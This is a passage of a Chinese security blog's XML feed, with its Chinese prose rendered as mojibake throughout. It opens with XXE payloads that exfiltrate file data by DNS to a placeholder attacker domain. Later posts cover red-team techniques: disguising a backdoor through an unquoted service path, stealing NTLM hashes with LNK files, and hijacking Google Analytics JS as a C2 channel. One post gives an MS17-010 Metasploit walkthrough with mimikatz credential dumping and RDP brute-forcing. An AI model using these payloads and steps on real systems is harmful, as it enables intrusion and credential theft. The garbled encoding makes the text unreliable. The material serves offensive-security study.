&lt;!ENTITY &amp;#x25; file &quot;dns-exfil-24&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;lib64&#x2F;erlang&#x2F;lib&#x2F;docbuilder-0.9.8.11&#x2F;dtd&#x2F;application.dtd&quot;&gt; &lt;!ENTITY % block &quot;xxx&quot; &gt; &lt;!ENTITY % common &#39; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-25&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;lib&#x2F;servlet-api.jar!&#x2F;javax&#x2F;servlet&#x2F;resources&#x2F;XMLSchema.dtd&quot;&gt; &lt;!ENTITY % xs-datatypes &#39; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-26&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure><h1 id="ç¬¬å…­é˜¶æ®µï¼ˆxxeé˜²å¾¡ï¼‰"><a href="#ç¬¬å…­é˜¶æ®µï¼ˆxxeé˜²å¾¡ï¼‰" class="headerlink" title="ç¬¬å…­é˜¶æ®µï¼ˆxxeé˜²å¾¡ï¼‰"></a>ç¬¬å…­é˜¶æ®µï¼ˆxxeé˜²å¾¡ï¼‰</h1><p>è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®ï¼Œè¿‡æ»¤å…³é”®è¯ï¼š&lt;!DOCTYPEå’Œ&lt;!ENTITYï¼Œæˆ–è€…SYSTEMå’ŒPUBLICï¼Œç¦ç”¨å¤–éƒ¨å®ä½“å¼•ç”¨ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¢é˜Ÿæ‰‹å†Œ-åˆ›æ–°çš„çº¢é˜ŸæŠ€æœ¯</title>
      <link href="2020/09/19/%E7%BA%A2%E9%98%9F%E6%89%8B%E5%86%8C-%E5%88%9B%E6%96%B0%E7%9A%84%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/"/>
      <url>2020/09/19/%E7%BA%A2%E9%98%9F%E6%89%8B%E5%86%8C-%E5%88%9B%E6%96%B0%E7%9A%84%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>â€œè„‘æ´æœ‰å¤šå¤§ï¼Œæ”»å‡»é¢å°±æœ‰å¤šå¤§ï¼â€</p></blockquote><p><strong>ä½¿ç”¨â€œæœªæŠ¥ä»·çš„æœåŠ¡è·¯å¾„â€è¯¯å¯¼åˆ†æäººå‘˜ï¼š</strong></p><p><strong>å¦‚æœè¦å°†åé—¨éƒ¨ç½²ä¸ºæ–°æœåŠ¡ï¼Œé‚£ä¹ˆâ€œUnquoted Service Pathâ€æ¥æ··æ·†æ£€æµ‹ç³»ç»Ÿå’Œåˆ†æäººå‘˜æ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©ã€‚</strong></p><p>æ —å­ï¼š<br>æœåŠ¡è·¯å¾„ï¼šCï¼š Program Files  decoymalware.exe<br>å®é™…æ¶æ„è½¯ä»¶ï¼šCï¼š Program.exe</p><p>å¯ä»¥å°†åˆæ³•ä¸”ç»è¿‡ç­¾åçš„äºŒè¿›åˆ¶æ–‡ä»¶æ”¾åœ¨æ­¤å¤„ï¼Œé‚£å°±æ›´åŠ å®Œç¾äº†ã€‚</p><p><strong>é‚£ä¹ˆä»€ä¹ˆæ˜¯â€œæœªæŠ¥ä»·çš„æœåŠ¡è·¯å¾„â€ï¼Ÿ</strong>å½“ä¸€ä¸ªæœåŠ¡è¢«åˆ›å»ºï¼Œå…¶å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„åŒ…å«ç©ºæ ¼å’Œå†…æœªå°é—­çš„å¼•å·ï¼Œä¼šå¯¼è‡´ä¸€ä¸ªæ¼æ´ï¼Œå®ƒå…è®¸ç”¨æˆ·è·å¾—SYSTEMæƒé™ã€‚åœ¨Windowsä¸­ï¼Œå¦‚æœæœåŠ¡æœªåŒ…å«åœ¨å¼•å·ä¸­å¹¶å…·æœ‰ç©ºæ ¼ï¼Œåˆ™å®ƒå°†ä½œä¸ºä¸­æ–­å¤„ç†è¯¥ç©ºæ ¼ï¼Œå¹¶å°†æœåŠ¡è·¯å¾„çš„å…¶ä½™éƒ¨åˆ†ä½œä¸ºå‚æ•°ä¼ é€’ã€‚</p><p><strong>æ ¹æœ¬åŸå› ï¼š</strong><br>è¿™æ˜¯ç”±CreateProcesså‡½æ•°å¼•èµ·çš„ï¼Œè¯¥å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹åŠå…¶ä¸»çº¿ç¨‹ã€‚</p><p>å…¶è¯­æ³•ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOOL CreateProcessAï¼ˆ</span><br><span class="line">  LPCSTR lpApplicationNameï¼Œ</span><br><span class="line">  LPSTR lpCommandLineï¼Œ</span><br><span class="line">  LPSECURITY_ATTRIBUTESlpProcessAttributesï¼Œ</span><br><span class="line">  LPSECURITY_ATTRIBUTES lpThreadAttributesï¼Œ</span><br><span class="line">  BOOL bInheritHandlesï¼Œ</span><br><span class="line">  DWORD dwCreationFlagsï¼Œ</span><br><span class="line">  LPVOID lpEnvironmentï¼Œ</span><br><span class="line">  LPCSTR lpCurrentDirectoryï¼Œ</span><br><span class="line">  LPSTARTUPINFOA lpStartupInfoï¼Œ</span><br><span class="line">  LPPROCESS_INFORMATION lpProcessInformation </span><br><span class="line">ï¼‰;</span><br></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²å‚æ•°<strong>lpApplicationName</strong>ã€‚è¿™æ˜¯å°†è¦æ‰§è¡Œçš„æ¨¡å—ï¼Œå¯ä»¥æ˜¯åŸºäºWindowsçš„åº”ç”¨ç¨‹åºã€‚è¯¥å­—ç¬¦ä¸²å¯ä»¥æ˜¯è¦æ‰§è¡Œçš„æ¨¡å—çš„å®Œæ•´è·¯å¾„å’Œæ–‡ä»¶åã€‚å¦‚æœæ–‡ä»¶åæ˜¯åŒ…å«ç©ºæ ¼çš„é•¿å­—ç¬¦ä¸²æ–‡æœ¬ï¼Œå¹¶ä¸”æ²¡æœ‰ç”¨å¼•å·å¼•èµ·æ¥ï¼Œåˆ™æ–‡ä»¶åå°†æŒ‰ä»å·¦åˆ°å³çš„é¡ºåºæ‰§è¡Œï¼Œç›´åˆ°åˆ°è¾¾ç©ºæ ¼ä¸ºæ­¢ï¼Œå¹¶å°†åœ¨æ­¤é—´éš”è·¯å¾„çš„æœ«å°¾é™„åŠ .exeã€‚</p><p>ä¸¾ä¸ªæ —å­ï¼š<br>å¦‚æœæˆ‘ä»¬çš„è¦è¿è¡ŒæœåŠ¡æ‰§è¡Œè·¯å¾„ä¸ºCï¼š Program Files  Aå­æ–‡ä»¶å¤¹ Bå­æ–‡ä»¶å¤¹ Cå­æ–‡ä»¶å¤¹ SomeExecutable.exe</p><p>ä¸ºäº†è¿è¡ŒSomeExecutable.exeï¼Œç³»ç»Ÿå°†æŒ‰ç…§ä»1åˆ°5çš„ä»¥ä¸‹é¡ºåºè§£é‡Šæ­¤è·¯å¾„ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. Cï¼š\ Program.exe</span><br><span class="line"></span><br><span class="line">2. Cï¼š\ Program Files \ A.exe</span><br><span class="line"></span><br><span class="line">3. Cï¼š\ Program Files \ Aå­æ–‡ä»¶å¤¹\ B.exe</span><br><span class="line"></span><br><span class="line">4. Cï¼š\ Program Files \ Aå­æ–‡ä»¶å¤¹\ Bå­æ–‡ä»¶å¤¹\ C.exe</span><br><span class="line"></span><br><span class="line">5. Cï¼š\ Program Files \ Aå­æ–‡ä»¶å¤¹\ Bå­æ–‡ä»¶å¤¹\ Cå­æ–‡ä»¶å¤¹\ SomeExecutable.exe</span><br></pre></td></tr></table></figure><p>å¦‚æœæ‰¾ä¸åˆ°Cï¼š Program.exeï¼Œåˆ™å°†æ‰§è¡ŒCï¼š Program Files  A.exeã€‚å¦‚æœæ‰¾ä¸åˆ°Cï¼š Program Files  A.exeï¼Œåˆ™å°†æ‰§è¡ŒCï¼š Program Files  A Subfolder  B.exeï¼Œä¾æ­¤ç±»æ¨ã€‚</p><p><strong>â€œä½¿ç”¨è¿œç¨‹é©±åŠ¨å™¨æ˜ å°„æ¥çªƒå–NTLMå“ˆå¸Œï¼š</strong></p><p>å¯ä»¥å»ºç«‹æŒ‡å‘è¿œç¨‹smbè·¯å¾„çš„LNKæ–‡ä»¶ã€‚ä»–ä»¬çš„ç›®çš„æ˜¯è¿«ä½¿å®¢æˆ·ç«¯å‘æ”»å‡»è€…çš„smbæœåŠ¡å™¨è¿›è¡Œèº«ä»½éªŒè¯ï¼Œè¿™æ ·ï¼Œæ”»å‡»è€…å°±å¯ä»¥çªƒå–å—å®³è€…çš„NTLMå“ˆå¸Œã€‚</p><p><strong>DNSä¸­æ¯’å¹¶æ³¨å…¥Google Analytics JSï¼š</strong></p><p>é€šè¿‡å¯¹æ™®é€šç”¨æˆ·çš„æµè§ˆå™¨æ´»åŠ¨åˆ†æï¼Œå‘ç°ï¼Œç”¨æˆ·å°†è¦è®¿é—®çš„ç½‘é¡µä¸­å¯èƒ½æœ‰ä¸€åŠä»¥ä¸ŠGoogle Analyticsï¼ˆåˆ†æï¼‰è¯·æ±‚ç›¸åº”JSæ–‡ä»¶ã€‚æ‰€ä»¥ï¼Œå¦‚æœèƒ½é€šè¿‡DNSæ¬ºéª—,MITMæˆ–è€…å…¶ä»–æ–¹å¼æ›¿æ¢è¿™äº›jsæ–‡ä»¶ï¼Œé‚£ä¹ˆå°†æ‹¥æœ‰å®Œç¾çš„C2ç³»ç»Ÿæ¥åŠ è½½æ¶æ„è½¯ä»¶ç¨‹åºï¼æ¶æ„è½¯ä»¶ç¨‹åºç”šè‡³éƒ½ä¸éœ€è¦å‘é€å•ä¸ªTCPæ•°æ®åŒ…ï¼Œåªéœ€è¦æŠŠç”¨æˆ·çš„æµè§ˆæ´»åŠ¨ä½œä¸ºæ¶æ„æµé‡çš„è½½ä½“ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡MS17-010çš„å®æˆ˜åˆ©ç”¨è¿‡ç¨‹</title>
      <link href="2020/09/19/%E8%AE%B0%E4%B8%80%E6%AC%A1MS17-010%E7%9A%84%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B/"/>
      <url>2020/09/19/%E8%AE%B0%E4%B8%80%E6%AC%A1MS17-010%E7%9A%84%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ˜¯ä½¿ç”¨sæ‰«æå™¨æ‰«ä¸€æ³¢ç«¯å£å¹¶å¯¼å‡ºæ–‡æœ¬</p><h2 id="æ¢ç´¢"><a href="#æ¢ç´¢" class="headerlink" title="æ¢ç´¢"></a>æ¢ç´¢</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ˜¯ä½¿ç”¨sæ‰«æå™¨æ‰«ä¸€æ³¢ç«¯å£å¹¶å¯¼å‡ºæ–‡æœ¬</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3142475439.png"></p><p>ç›´æ¥ä¸Šmsfï¼ˆåˆ°ä½ï¼niceï¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo msfconsol    è¿›å…¥msf</span><br><span class="line">search ms17     æŸ¥æ‰¾å¯¹åº”çš„ms17</span><br><span class="line"><span class="keyword">use</span> 9    è¿›å…¥<span class="title">ms17</span></span><br><span class="line"><span class="title">set</span> <span class="title">rhost</span> <span class="title">IP</span>    è®¾ç½®ç›¸åº”çš„<span class="title">IP</span></span><br><span class="line"><span class="title">show</span> <span class="title">options</span>    æŸ¥çœ‹<span class="title">IP</span>æ˜¯å¦ç¬¦åˆ</span><br><span class="line"><span class="title">run</span>     è¿è¡Œ</span><br><span class="line"></span><br><span class="line">å¦‚æœæ‰“æˆåŠŸçš„è¯å°±çˆ†ä¸€ä¸‹å¯†ç </span><br><span class="line"><span class="title">load</span> <span class="title">mimikatz</span></span><br><span class="line"><span class="title">kerberos</span></span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>å¦‚æœä»¥ä¸Šçš†æˆåŠŸï¼Œå°±å¯ä»¥æ’å¯†ç å•¦~</p><p>å…ˆæ ¹æ®å¾—åˆ°çš„è´¦å·å¯†ç å°†passå’Œuseræ–‡æœ¬è¿›è¡Œä¿®æ”¹</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2370972199.png"></p><p>ç‚¹å‡»å¼€å§‹å³å¯ï¼ˆä¸‡ä¸€è¿æ°”å¥½æ’åˆ°äº†å°±å¯ä»¥è¿ä»–çš„3389è¿›è¡Œä¿¡æ¯æ”¶é›†å•¦</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/63357955.png"></p><p>â€¦â€¦</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¢é˜Ÿæ‰‹å†Œ-æŠ€æœ¯ä¿¡æ¯æ”¶é›†</title>
      <link href="2020/09/18/%E7%BA%A2%E9%98%9F%E6%89%8B%E5%86%8C-%E6%8A%80%E6%9C%AF%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2020/09/18/%E7%BA%A2%E9%98%9F%E6%89%8B%E5%86%8C-%E6%8A%80%E6%9C%AF%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<blockquote><p>â€œæŠ€æœ¯ä¿¡æ¯æ”¶é›†åŒ…æ‹¬ç¡®å®šå¯¹æ‰‹æ‰€éœ€çš„æƒ…æŠ¥çš„å…³é”®æŠ€æœ¯è¦ç´ çš„è¿‡ç¨‹ï¼Œä»¥ä¾¿æœ€ä½³åœ°è¿›è¡Œæ”»å‡»ã€‚â€</p></blockquote><h5 id="å¸¸ç”¨å¾—æ‰‹æ³•æŠ€å·§æ€»ç»“ï¼š"><a href="#å¸¸ç”¨å¾—æ‰‹æ³•æŠ€å·§æ€»ç»“ï¼š" class="headerlink" title="å¸¸ç”¨å¾—æ‰‹æ³•æŠ€å·§æ€»ç»“ï¼š"></a>å¸¸ç”¨å¾—æ‰‹æ³•æŠ€å·§æ€»ç»“ï¼š</h5><p>1.è·å–OSINTæ•°æ®é›†å’Œä¿¡æ¯ï¼šå¼€æºæƒ…æŠ¥ï¼ˆOSINTï¼‰æ˜¯ä»å…¬å¼€æ¥æºæ”¶é›†çš„æƒ…æŠ¥ã€‚è¿™å¯ä»¥åŒ…æ‹¬åœ¨çº¿æ”¶é›†çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ä»æœç´¢å¼•æ“æ”¶é›†çš„ä¿¡æ¯ï¼Œä»¥åŠåœ¨ç°å®ä¸–ç•Œä¸­æ”¶é›†çš„ä¿¡æ¯ï¼Œå„ç§ç¤¾äº¤ç½‘ç«™ï¼Œåšå®¢ï¼Œè´­ç‰©ç½‘ç«™ï¼Œå¿«é€’å…¬å¸â€¦â€¦ã€‚</p><p>2.è¿›è¡Œä¸»åŠ¨æ‰«æï¼šä¸»åŠ¨æ‰«ææ˜¯å°†ä¼ è¾“å‘é€åˆ°ç»ˆç«¯èŠ‚ç‚¹å¹¶åˆ†æå“åº”ä»¥è¯†åˆ«æœ‰å…³é€šä¿¡ç³»ç»Ÿçš„ä¿¡æ¯çš„è¡Œä¸ºã€‚å¦‚AWVS,APPSCAN,OPENVAS,NESSUSç­‰ã€‚</p><p>3.è¿›è¡Œè¢«åŠ¨æ‰«æï¼šè¢«åŠ¨æ‰«ææ˜¯æŸ¥çœ‹ç°æœ‰ç½‘ç»œæµé‡ä»¥è¯†åˆ«æœ‰å…³é€šä¿¡ç³»ç»Ÿçš„ä¿¡æ¯çš„è¡Œä¸ºã€‚</p><p>4.è¿›è¡Œç¤¾ä¼šå·¥ç¨‹ï¼šç¤¾ä¼šå·¥ç¨‹å­¦æ˜¯æ“çºµäººä»¥ä½¿ä»–ä»¬æ³„éœ²ä¿¡æ¯æˆ–é‡‡å–è¡ŒåŠ¨çš„å®è·µã€‚èµ°è¿‡æœ€è¿œçš„è·¯å°±æ˜¯çº¢é˜Ÿäººå‘˜çš„å¥—è·¯ï¼Œä»€ä¹ˆä¸¢Uç›˜ï¼Œä½¯è£…ç”µå·¥ä»€ä¹ˆçš„ï¼Œæ–­ç½‘æ”»å‡»å•¥çš„ï¼Œæ‹”ç½‘çº¿é‚£å¿…é¡»ä¹Ÿæ˜¯ä»¬æŠ€æœ¯æ´»ã€‚</p><p>5.ç¡®å®šç¬¬ä¸‰æ–¹åŸºç¡€è®¾æ–½æœåŠ¡ï¼šåŸºç¡€ç»“æ„æœåŠ¡åŒ…æ‹¬æ“ä½œé€šä¿¡ç¯å¢ƒæ‰€éœ€çš„ç¡¬ä»¶ï¼Œè½¯ä»¶å’Œç½‘ç»œèµ„æºã€‚è¯¥åŸºç¡€ç»“æ„å¯ä»¥ç”±ç¬¬ä¸‰æ–¹ç®¡ç†ï¼Œè€Œä¸æ˜¯ç”±æ‰€å±ç»„ç»‡ç®¡ç†ã€‚æ¯”å¦‚ç”¨çš„å“ªä¸ªè¿è¥å•†æµé‡ï¼Œé˜²ç«å¢™ç”¨çš„å“ªå®¶çš„ï¼Œè·¯ç”±å™¨ç”¨çš„å“ªå®¶çš„ã€‚ã€‚ã€‚ã€‚ç­‰ç­‰ã€‚</p><p>6.ç¡®å®šåŸŸå’ŒIPåœ°å€ç©ºé—´ï¼šåŸŸåæ˜¯äººç±»å¯è¯»çš„åç§°ï¼Œç”¨äºè¡¨ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªIPåœ°å€ã€‚IPåœ°å€æ˜¯ç½‘ç»œä¸Šè®¡ç®—è®¾å¤‡çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚è¿™ä¸¤ä¸ªä¿¡æ¯å¯¹æƒ³è¦äº†è§£ç½‘ç»œç»“æ„çš„å¯¹æ‰‹éƒ½æ˜¯æœ‰ä»·å€¼çš„ã€‚è¡Œè¯ï¼šæ”¶é›†ç½‘ç»œèµ„äº§ï¼Œè¶Šå¤šè¶Šå¥½ï¼Œåƒé‡Œä¹‹å ¤ï¼Œæ„§äºèšç©´ã€‚</p><p>7.ç¡®å®šå¤–éƒ¨ç½‘ç»œä¿¡ä»»ä¾èµ–å…³ç³»ï¼šç½‘ç»œä¿¡ä»»å¯ç”¨å…·æœ‰ç‰¹å®šè®¿é—®æƒé™çš„ä¸åŒç½‘ç»œä¹‹é—´çš„é€šä¿¡ã€‚ç½‘ç»œä¿¡ä»»å¯ä»¥åŒ…æ‹¬åŸŸä¿¡ä»»çš„å®ç°æˆ–è™šæ‹Ÿä¸“ç”¨ç½‘ç»œï¼ˆVPNï¼‰çš„ä½¿ç”¨ã€‚</p><p>8.ç¡®å®šå›ºä»¶ç‰ˆæœ¬ï¼šå›ºä»¶æ˜¯ç¼–ç¨‹åˆ°è®¾å¤‡åªè¯»å­˜å‚¨å™¨ä¸­çš„æ°¸ä¹…è½¯ä»¶ã€‚ä¸å…¶ä»–ç±»å‹çš„è½¯ä»¶ä¸€æ ·ï¼Œå›ºä»¶å¯èƒ½ä¼šéšæ—¶é—´æ›´æ–°å¹¶å…·æœ‰å¤šä¸ªç‰ˆæœ¬ã€‚</p><p>9.å‘ç°ç›®æ ‡ç™»å½•/ç”µå­é‚®ä»¶åœ°å€æ ¼å¼ï¼šç”µå­é‚®ä»¶åœ°å€ï¼Œç™»å½•å‡­æ®å’Œå…¶ä»–å½¢å¼çš„åœ¨çº¿èº«ä»½éªŒè¯é€šå¸¸å…±äº«ä¸€ç§é€šç”¨æ ¼å¼ã€‚è¿™ä½¿å¾—çŒœæµ‹ç›¸åŒåŸŸå†…çš„å…¶ä»–å‡­æ®å˜å¾—æ›´åŠ å®¹æ˜“ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå·²çŸ¥çš„ç”µå­é‚®ä»¶åœ°å€æ˜¯<a href="mailto:&#109;&#x69;&#110;&#103;&#x7a;&#105;&#64;&#99;&#x6f;&#109;&#x70;&#x61;&#x6e;&#x79;&#x2e;&#x63;&#x6f;&#x6d;">&#109;&#x69;&#110;&#103;&#x7a;&#105;&#64;&#99;&#x6f;&#109;&#x70;&#x61;&#x6e;&#x79;&#x2e;&#x63;&#x6f;&#x6d;</a>ï¼Œåˆ™å…¬å¸ä¸­çš„å…¶ä»–äººå¾ˆæœ‰å¯èƒ½ä¼šä½¿ç”¨ç›¸åŒæ ¼å¼çš„ç”µå­é‚®ä»¶ã€‚</p><p>10.æšä¸¾å®¢æˆ·ç«¯é…ç½®:å®¢æˆ·ç«¯é…ç½®ä¿¡æ¯ï¼ˆä¾‹å¦‚æ“ä½œç³»ç»Ÿå’ŒWebæµè§ˆå™¨ï¼‰ä»¥åŠå…¶ä»–ä¿¡æ¯ï¼ˆä¾‹å¦‚ç‰ˆæœ¬æˆ–è¯­è¨€ï¼‰é€šå¸¸ä½œä¸ºWebæµè§ˆé€šä¿¡çš„ä¸€éƒ¨åˆ†è¿›è¡Œä¼ è¾“ã€‚è¿™å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼æ¥å®Œæˆï¼ŒåŒ…æ‹¬ä½¿ç”¨å—æ„ŸæŸ“çš„ç½‘ç«™æ¥æ”¶é›†æœ‰å…³è®¿é—®è®¡ç®—æœºçš„è¯¦ç»†ä¿¡æ¯ã€‚</p><p>11.æšä¸¾é¢å‘å¤–éƒ¨çš„è½¯ä»¶åº”ç”¨ç¨‹åºæŠ€æœ¯ï¼Œè¯­è¨€å’Œä¾èµ–é¡¹:å°†ä½¿ç”¨ä¸åŒçš„æŠ€æœ¯ï¼Œè¯­è¨€å’Œä¾èµ–å…³ç³»æ¥æ„å»ºè½¯ä»¶åº”ç”¨ç¨‹åºã€‚æ­¤ä¿¡æ¯å¯èƒ½ä¼šæ‰¾åˆ°çªç ´å£ï¼Œæ’•å¼€å£å­ã€‚</p><p>12.è¯†åˆ«èŒä½å‘å¸ƒå’Œéœ€æ±‚/å·®è·:åœ¨å…¬å¸ç«™ç‚¹æˆ–å…¶ä»–è®ºå›ä¸Šçš„èŒä½å‘å¸ƒæä¾›æœ‰å…³ç»„ç»‡ç»“æ„çš„ä¿¡æ¯ï¼Œå¹¶ç»å¸¸ä¸ºç»„ç»‡å†…æŸäººæä¾›è”ç³»ä¿¡æ¯ã€‚è¿™å¯èƒ½ä¼šæä¾›æœ‰å…³ç»„ç»‡å†…æŠ€æœ¯çš„å¯¹æ‰‹ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯å¯èƒ½å¯¹æ”»å‡»å¾ˆæœ‰ç”¨ï¼Œæˆ–è€…æ´æ‚‰å¯èƒ½çš„å®‰å…¨å¼±ç‚¹æˆ–æ£€æµ‹æˆ–ä¿æŠ¤æœºåˆ¶çš„å±€é™æ€§ï¼Œç›´æ¥å¯å‘é€é’“é±¼é‚®ä»¶æ”»å‡»ã€‚</p><p>13.è¯†åˆ«å®‰å…¨é˜²å¾¡èƒ½åŠ›å’Œé˜²å¾¡æœåŠ¡ï¼šå®‰å…¨é˜²å¾¡åŠŸèƒ½æ—¨åœ¨é˜»æ­¢æˆ–é™åˆ¶æœªç»æˆæƒçš„ç½‘ç»œæµé‡æˆ–å…¶ä»–ç±»å‹çš„è®¿é—®ï¼Œå¦‚è£…çš„ä»€ä¹ˆæ€æ¯’è½¯ä»¶ï¼Œé˜²ç«å¢™è§„åˆ™ï¼Œidsç­‰ç­‰ã€‚æ”»å‡»è€…å¯ä»¥å°è¯•å°†Webé˜²å¾¡æœåŠ¡æ ‡è¯†ä¸ºCloudFlareï¼ŒIPBanå’ŒSnortã€‚è¿™å¯ä»¥é€šè¿‡è¢«åŠ¨åœ°æ£€æµ‹æœåŠ¡ï¼ˆä¾‹å¦‚CloudFlareè·¯ç”±ï¼‰æˆ–ä¸»åŠ¨åœ°ï¼ˆä¾‹å¦‚æœ‰æ„åœ°è§¦å‘å®‰å…¨é˜²å¾¡ï¼‰æ¥å®Œæˆã€‚</p><p>14.è¯†åˆ«ä¾›åº”é“¾ï¼šä¾›åº”é“¾åŒ…æ‹¬ç”¨äºå°†äº§å“æˆ–æœåŠ¡ä»ä¾›åº”å•†è½¬ç§»åˆ°æ¶ˆè´¹è€…çš„äººå‘˜ï¼Œæµç¨‹å’ŒæŠ€æœ¯ã€‚äº†è§£ä¾›åº”é“¾å¯èƒ½ä¸ºæ”»å‡»æä¾›æœºä¼šï¼Œä»¥åˆ©ç”¨ä½œä¸ºä¾›åº”é“¾ä¸€éƒ¨åˆ†çš„æŠ€æœ¯æˆ–äº’è¿ã€‚</p><p>15.ç¡®å®šç½‘ç»œæ‹“æ‰‘ç»“æ„ï¼šç½‘ç»œæ‹“æ‰‘æ˜¯ç½‘ç»œå„ç§å…ƒç´ ï¼ˆä¾‹å¦‚ï¼ŒæœåŠ¡å™¨ï¼Œå·¥ä½œç«™ï¼Œæ‰“å°æœºï¼Œè·¯ç”±å™¨ï¼Œé˜²ç«å¢™ç­‰ï¼‰çš„å¸ƒç½®ã€‚æ˜ å°„ç½‘ç»œå¯ä»¥ä½¿å¯¹æ‰‹äº†è§£å…ƒç´ ä¹‹é—´çš„è¿æ¥æˆ–ç›¸å…³æ–¹å¼ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ‡’äººå·¥å…·æŒ‡å—-powershellé€Ÿæ‰«</title>
      <link href="2020/09/15/%E6%87%92%E4%BA%BA%E5%B7%A5%E5%85%B7%E6%8C%87%E5%8D%97-powershell%E9%80%9F%E6%89%AB/"/>
      <url>2020/09/15/%E6%87%92%E4%BA%BA%E5%B7%A5%E5%85%B7%E6%8C%87%E5%8D%97-powershell%E9%80%9F%E6%89%AB/</url>
      
